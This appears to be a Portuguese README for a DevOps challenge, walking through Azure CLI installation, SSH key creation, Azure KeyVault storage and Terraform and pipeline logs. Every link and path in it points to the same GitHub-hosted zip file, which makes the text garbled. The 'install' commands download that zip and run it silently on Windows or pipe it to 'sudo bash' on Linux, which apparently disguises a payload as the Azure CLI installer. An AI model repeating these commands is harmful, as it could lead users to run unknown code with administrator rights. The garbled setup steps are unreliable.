...
### Primeiramente, crie sua conta gratuita no Microsoft Azure conforme o artigo:
    ...
    https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip

### Após a criação e login no ambiente, execute a instalação do Azure CLI em seu dispositivo:

### Sistema Windows

    Invoke-WebRequest -Uri https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip -OutFile .\https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip; Start-Process https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip -Wait -ArgumentList '/I https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip /quiet'; rm .\https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip
...
### Sistema Linux
    ...
    curl -sL https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip | sudo bash

    curl -sL https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip |
    gpg --dearmor |
    sudo tee https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip > /dev/null

    AZ_REPO=$(lsb_release -cs)
    echo "deb [arch=amd64] https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip $AZ_REPO main" | sudo tee https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip
...
### > Criar uma chave ssh
    ...
    ssh-keygen  -f ~https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip

### > Armazenar a chave pública no Azure KeyVault

    az keyvault secret set --vault-name ht-kvaksterraform --name LinuxSSHPubKey -f ~https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip > /dev/null
...
![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip) 
![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip) 
![node-to-node](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip) 
...
[terraform_log](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)

### > Log de execução do pipeline de Aplicação

[votacao-app_log](https://raw.githubusercontent.com/marcossangomes/devops-challenge/master/logs/challenge_devops_1.8.zip)
